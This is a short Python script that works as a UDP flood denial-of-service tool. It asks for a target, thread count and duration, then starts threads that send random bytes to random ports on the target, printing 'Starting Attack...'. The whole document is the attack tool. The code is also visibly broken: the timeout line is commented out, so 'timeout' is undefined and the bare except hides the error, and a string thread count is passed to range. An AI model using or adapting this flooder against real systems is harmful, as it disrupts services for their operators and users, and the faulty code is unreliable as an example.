import socket, random, threading, sys, time

try: 
    target = input('target: ')
    threads = input('threads: ')
    timer = input('time: ')
except IndexError:
    print('\n[+] Command usage: Python' + sys.argv[0] + ' <target> <thread> <time> !')
    sys.exit()

#timeout = time.time() + 1 * timer 

def attack():
    try:
        bytes = random._urandom(1024)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < timeout:
            dport = random.randint(20,55500)
            sock.sendto(bytes*random.randint(5,15),(target, dport))
        return
        sys.exit
    except:
        pass

print('\n[+] Starting Attack...')
for x in range(0, threads):
    threading.Thread(target=attack).start()

print('\n[+] Attack Running...')
